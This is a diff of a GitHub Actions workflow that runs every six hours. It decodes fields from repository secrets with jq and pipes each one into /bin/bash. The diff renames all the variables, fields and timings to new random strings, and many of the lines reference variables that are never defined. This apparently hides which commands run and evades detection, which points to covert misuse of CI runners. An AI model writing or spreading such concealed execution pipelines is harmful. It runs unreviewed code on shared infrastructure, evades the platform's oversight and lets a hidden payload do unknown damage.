@@ -1,34 +1,27 @@
 name: wnnianli
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 0/6 * * *'
+    - cron: '41 3/6 * * *'
 
-jobs:  # 6860
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wnnianli
         env:
-          llklg95: ${{ secrets.llklg95 }}
+          jkzgg657: ${{ secrets.jkzgg657 }}
         run: |
-          echo $llklg95 | jq -r .mhn397 | /bin/bash
-          echo $ths806 | jq -r .mkww0300 | /bin/bash
-          echo $q40621 | jq -r .oeud5 | /bin/bash
-          echo $f388 | jq -r .g7755 | /bin/bash
-          echo $b263 | jq -r .xk1272 | /bin/bash
-          echo $zjd6789 | jq -r .bawcj00 | /bin/bash
-          echo $o88059 | jq -r .ogob65528 | /bin/bash
-          echo $gmu63172 | jq -r .om88 | /bin/bash
-          echo $wemkn432 | jq -r .for8026 | /bin/bash
-          echo $pm0180 | jq -r .zld6 | /bin/bash
-          echo $wdo847 | jq -r .uk39 | /bin/bash
-          echo $hb10 | jq -r .v6730 | /bin/bash
-          echo $wvpy174 | jq -r .s7 | /bin/bash
-          echo $oforn204 | jq -r .ywc3030 | /bin/bash
-          echo $kgdw35 | jq -r .ctk1 | /bin/bash
-          echo $w14279 | jq -r .wz1063 | /bin/bash
+          echo $jkzgg657 | jq -r .h9 | /bin/bash
+          echo $oeu940 | jq -r .iwzcy634 | /bin/bash
+          echo $w91 | jq -r .u57 | /bin/bash
+          echo $tr498 | jq -r .c136 | /bin/bash
+          echo $qta0906 | jq -r .y9 | /bin/bash
+          echo $qol39506 | jq -r .x77846 | /bin/bash
+          echo $igshy8 | jq -r .wla35026 | /bin/bash
+          echo $ull8880 | jq -r .d9 | /bin/bash
+          echo $hyps2898 | jq -r .awvsn3688 | /bin/bash
+          echo $s5646 | jq -r .c4204 | /bin/bash
+          echo $mrl7 | jq -r .rsmu0926 | /bin/bash
 
